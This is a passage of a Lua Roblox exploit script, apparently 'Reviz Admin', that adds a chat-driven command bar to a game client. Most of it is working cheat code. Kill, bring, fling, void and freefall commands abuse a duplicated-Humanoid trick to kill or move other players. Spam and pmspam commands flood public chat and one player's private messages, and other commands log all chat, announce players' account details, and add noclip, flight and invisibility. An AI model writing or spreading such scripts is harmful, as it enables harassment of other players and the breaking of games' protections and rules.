        for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
        end
    end
    if string.sub(msg, 1, 4) == (prefix.."id ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 5))) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
        end
    end
    if string.sub(msg, 1, 6) == (prefix..".age ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 7))) do
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = player.AccountAge.." Days";
            Text = "Account age of "..player.Name;
            })
        end
    end
    if string.sub(msg, 1, 5) == (prefix..".id ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = player.UserId.." ID";
            Text = "Account ID of "..player.Name;
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."gameid") then
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Game ID";
        Text = "Game ID: ".. game.GameId;
        })
    end
    if string.sub(msg, 1, 4) == (prefix.."pgs") then
        local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
        if pgscheck == true then
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "PGSPhysicsSolverEnabled";
            Text = "PGS is Enabled!";
            })
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "PGSPhysicsSolverEnabled";
            Text = "PGS is Disabled!";
            })
        end
    end
    if string.sub(msg, 1, 12) == (prefix.."removeinvis") then
        for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v:IsA("Part") then
                if v.Transparency == 1 then
                    if v.Name ~= "HumanoidRootPart" then
                        v:Destroy()
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."removefog") then
        game:GetService("Lighting").FogStart = 0
        game:GetService("Lighting").FogEnd = 9999999999999
    end
    if string.sub(msg, 1, 8) == (prefix.."disable") then
        lplayer.Character.Humanoid.Parent = lplayer
    end
    if string.sub(msg, 1, 7) == (prefix.."enable") then
        lplayer.Humanoid.Parent = lplayer.Character
    end
    if string.sub(msg, 1, 8) == (prefix.."prefix ") then
        prefix = (string.sub(msg, 9, 9))
        wait(0.1)
        change()
        wait(0.1)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Prefix changed!";
        Text = "Prefix is now "..prefix..". Use ;resetprefix to reset to ;";
        })
    end
    if string.sub(msg, 1, 12) == (";resetprefix") then
        prefix = ";"
        wait(0.1)
        change()
        wait(0.1)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Prefix changed!";
        Text = "Prefix is now "..prefix..". Make sure it's one key!";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."flyspeed ") then
        speedfly = string.sub(msg, 11)
        wait()
        change()
    end
    if string.sub(msg, 1, 8) == (prefix.."carpet ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            local Anim3 = Instance.new("Animation")
            Anim3.AnimationId = "rbxassetid://282574440"
            local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
            track3:Play(.1, 1, 1)
            bplrr = v.Name
            banpl = true
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."uncarpet") then
        banpl = false
    end
    if string.sub(msg, 1, 7) == (prefix.."stare ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            staring = true
            stareplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unstare") then
        staring = false
    end
    if string.sub(msg, 1, 8) == (prefix.."logchat") then
        chatlogs = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "LogChat enabled";
        Text = "Now logging all player chat.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."unlogchat") then
        chatlogs = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "LogChat disabled";
        Text = "Stopped logging all player chat.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."fixcam") then
        game:GetService("Workspace").CurrentCamera:Destroy()
        wait(0.1)
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
        game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
        lplayer.CameraMinZoomDistance = 0.5
        lplayer.CameraMaxZoomDistance = 400
        lplayer.CameraMode = "Classic"
    end
    if string.sub(msg, 1, 8) == (prefix.."unstate") then
        changingstate = false
    end
end)
 
local function tp()
    for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            if player.Name == brplr then
                player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 2
            end
        end
    end
end
local function tpall()
    for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 3
        end
    end
end
spawn(function()
    while wait(spamdelay) do
        if spamming == true then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
        end
    end
end)
spawn(function()
    while wait(spamdelay) do
        if spammingpm == true then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..pmspammed.." @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "All")
        end
    end
end)
spawn(function()
    while wait() do
        if cbring == true then
            tp()
        end
    end
end)
spawn(function()
    while wait() do
        if cbringall == true then
            tpall()
        end
    end
end)
 
Mouse.KeyDown:connect(function(Key)
    if Key == prefix then
        CMDBAR:CaptureFocus()
    end
end)
 
CMDBAR.FocusLost:connect(function(enterPressed)
    if enterPressed then
        if string.sub(CMDBAR.Text, 1, 5) == ("kill ") then
            if string.sub(CMDBAR.Text, 6) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6)))do
                    local NOW = lplayer.Character.HumanoidRootPart.CFrame
                    lplayer.Character.Humanoid.Name = 1
                    local l = lplayer.Character["1"]:Clone()
                    l.Parent = lplayer.Character
                    l.Name = "Humanoid"
                    wait(0.1)
                    lplayer.Character["1"]:Destroy()
                    game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                    lplayer.Character.Animate.Disabled = true
                    wait(0.1)
                    lplayer.Character.Animate.Disabled = false
                    lplayer.Character.Humanoid.DisplayDistanceType = "None"
                    for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                    lplayer.Character.Humanoid:EquipTool(v)
                    end
                    local function tp(player,player2)
                    local char1,char2=player.Character,player2.Character
                    if char1 and char2 then
                    char1:MoveTo(char2.Head.Position)
                    end
                    end
                    wait(0.1)
                    lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                    wait(0.2)
                    lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                    wait(0.5)
                    lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                    wait(0.7)
                    tp(lplayer,game:GetService("Players")[v.Name])
                    wait(0.7)
                    lplayer.Character.HumanoidRootPart.CFrame = NOW
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Tools needed!";
                    Text = "You need a tool in your backpack for this command!";
                    })
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("bring ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
                end
                end
                local function getout(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                tp(game:GetService("Players")[v.Name], lplayer)
                wait(0.2)
                tp(game:GetService("Players")[v.Name], lplayer)
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.5)
                getout(lplayer, game:GetService("Players")[v.Name])
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("spin ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                spinplr = v
                wait(0.5)
                spin = true
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unspin") then
            spin = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("attach ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                attplr = v
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("unattach ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                local function getout(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                getout(lplayer, game:GetService("Players")[v.Name])
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("follow ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                followed = true
                flwplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unfollow") then
            followed = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("freefall ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("trail ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                traill = true
                trlplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("untrail") then
            traill = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("orbit ") then
            if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                    local o = Instance.new("RocketPropulsion")
                    o.Parent = lplayer.Character.HumanoidRootPart
                    o.Name = "Orbit"
                    o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                    o:Fire()
                    noclip = true
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unorbit") then
            lplayer.Character.HumanoidRootPart.Orbit:Destroy()
            noclip = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("fling ") then
            if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                    local y = Instance.new("RocketPropulsion")
                    y.Parent = lplayer.Character.HumanoidRootPart
                    y.CartoonFactor = 1
                    y.MaxThrust = 800000
                    y.MaxSpeed = 1000
                    y.ThrustP = 200000
                    y.Name = "Fling"
                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                    y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                    y:Fire()
                    noclip = true
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unfling") then
            noclip = false
            lplayer.Character.HumanoidRootPart.Fling:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
            wait(0.4)
            lplayer.Character.HumanoidRootPart.Fling:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("fecheck") then
            if game:GetService("Workspace").FilteringEnabled == true then
                warn("FE is Enabled (Filtering Enabled)")
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "FE is Enabled";
                    Text = "Filtering Enabled. Enjoy using Reviz Admin!";
                })
            else
                warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "FE is Disabled";
                    Text = "Filtering Disabled. Consider using a different admin script.";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("void ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("noclip") then
            noclip = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Noclip enabled";
            Text = "Type ;clip to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("clip") then
            noclip = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Noclip disabled";
            Text = "Type ;noclip to enable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("speed ") then
            lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 7))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("ws ") then
            lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("hipheight ") then
            lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 11))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("hh ") then
            lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("jumppower ") then
            lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 11))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("jp ") then
            lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("default") then
            lplayer.Character.Humanoid.JumpPower = 50
            lplayer.Character.Humanoid.WalkSpeed = 16
            lplayer.Character.Humanoid.HipHeight = 0
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("annoy ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                annoying = true
                annplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unannoy") then
            annoying = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("headwalk ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                hwalk = true
                hdwplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("unheadwalk") then
            hwalk = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("nolimbs") then
            lplayer.Character["Left Leg"]:Destroy()
            lplayer.Character["Left Arm"]:Destroy()
            lplayer.Character["Right Leg"]:Destroy()
            lplayer.Character["Right Arm"]:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("god") then
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "FE Godmode enabled";
            Text = "Use ;grespawn or ;respawn to remove.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("drophats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Parent = workspace
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("droptool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Parent = workspace
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("loopdhats") then
            droppinghats = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Enabled";
            Text = "Type ;unloopdhats to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unloopdhats") then
            droppinghats = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Disabled";
            Text = "Type ;loopdhats to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("loopdtool") then
            droppingtools = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Enabled";
            Text = "Type ;unloopdtool to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unloopdtool") then
            droppingtools = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Disabled";
            Text = "Type ;loopdtool to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("invisible") then -- Credit to Timeless
            Local = game:GetService('Players').LocalPlayer
            Char  = Local.Character
            touched,tpdback = false, false
            box = Instance.new('Part',workspace)
            box.Anchored = true
            box.CanCollide = true
            box.Size = Vector3.new(10,1,10)
            box.Position = Vector3.new(0,10000,0)
            box.Touched:connect(function(part)
                if (part.Parent.Name == Local.Name) then
                    if touched == false then
                        touched = true
                        function apply()
                            if script.Disabled ~= true then
                                no = Char.HumanoidRootPart:Clone()
                                wait(.25)
                                Char.HumanoidRootPart:Destroy()
                                no.Parent = Char
                                Char:MoveTo(loc)
                                touched = false
                            end end
                        if Char then
                            apply()
                        end
                    end
                end
            end)
            repeat wait() until Char
            loc = Char.HumanoidRootPart.Position
            Char:MoveTo(box.Position + Vector3.new(0,.5,0))
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Invisibility enabled!";
            Text = "Reset or use ;respawn to remove.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("view ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                if game:GetService("Players")[v.Name].Character.Humanoid then
                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
                else
                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unview") then
            if lplayer.Character.Humanoid then
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
            else
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("goto ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            end
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("fly") then
        repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
        repeat wait() until Mouse
       
        local T = lplayer.Character.HumanoidRootPart
        local CONTROL = {F = 0, B = 0, L = 0, R = 0}
        local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
        local SPEED = speedget
       
        local function fly()
            flying = true
            local BG = Instance.new('BodyGyro', T)
            local BV = Instance.new('BodyVelocity', T)
            BG.P = 9e4
            BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            BG.cframe = T.CFrame
            BV.velocity = Vector3.new(0, 0.1, 0)
            BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
            spawn(function()
            repeat wait()
            lplayer.Character.Humanoid.PlatformStand = true
            if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
            SPEED = 50
            elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
            SPEED = 0
            end
            if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
            BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
            lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
            elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
            BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
            else
            BV.velocity = Vector3.new(0, 0.1, 0)
            end
            BG.cframe = workspace.CurrentCamera.CoordinateFrame
                    until not flying
                    CONTROL = {F = 0, B = 0, L = 0, R = 0}
                    lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                    SPEED = 0
                    BG:destroy()
                    BV:destroy()
                    lplayer.Character.Humanoid.PlatformStand = false
                end)
            end
        Mouse.KeyDown:connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = speedfly
            elseif KEY:lower() == 's' then
                CONTROL.B = -speedfly
            elseif KEY:lower() == 'a' then
                CONTROL.L = -speedfly
            elseif KEY:lower() == 'd' then
                CONTROL.R = speedfly
            end
        end)
        Mouse.KeyUp:connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = 0
            elseif KEY:lower() == 's' then
                CONTROL.B = 0
            elseif KEY:lower() == 'a' then
                CONTROL.L = 0
            elseif KEY:lower() == 'd' then
                CONTROL.R = 0
            end
        end)
        fly()
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("unfly") then
            flying = false
            lplayer.Character.Humanoid.PlatformStand = false
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("chat ") then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(CMDBAR.Text, 6)), "All")
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("spam ") then
            spamtext = (string.sub(CMDBAR.Text, 6))
            spamming = true
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unspam") then
            spamming = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("spamwait ") then
            spamdelay = (string.sub(CMDBAR.Text, 10))
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("pmspam ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                pmspammed = v.Name
                spammingpm = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unpmspam") then
            spammingpm = false
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("cfreeze ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 9))) do
                v.Character["Left Leg"].Anchored = true
                v.Character["Left Arm"].Anchored = true
                v.Character["Right Leg"].Anchored = true
                v.Character["Right Arm"].Anchored = true
                v.Character.Torso.Anchored = true
                v.Character.Head.Anchored = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("uncfreeze ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 11))) do
                v.Character["Left Leg"].Anchored = false
                v.Character["Left Arm"].Anchored = false
                v.Character["Right Leg"].Anchored = false
                v.Character["Right Arm"].Anchored = false
                v.Character.Torso.Anchored = false
                v.Character.Head.Anchored = false
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unlockws") then
            local a = game:GetService("Workspace"):getChildren()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Locked = false
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Locked = false
                        end
                    end
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "Workspace unlocked. Use ;lockws to lock.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("lockws") then
            local a = game:GetService("Workspace"):getChildren()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Locked = true
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Locked = true
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("btools") then
            local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
            Clone_T.BinType = "Clone"
            local Destruct = Instance.new("HopperBin",lplayer.Backpack)
            Destruct.BinType = "Hammer"
            local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
            Hold_T.BinType = "Grab"
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("pstand") then
            lplayer.Character.Humanoid.PlatformStand = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unpstand") then
            lplayer.Character.Humanoid.PlatformStand = false
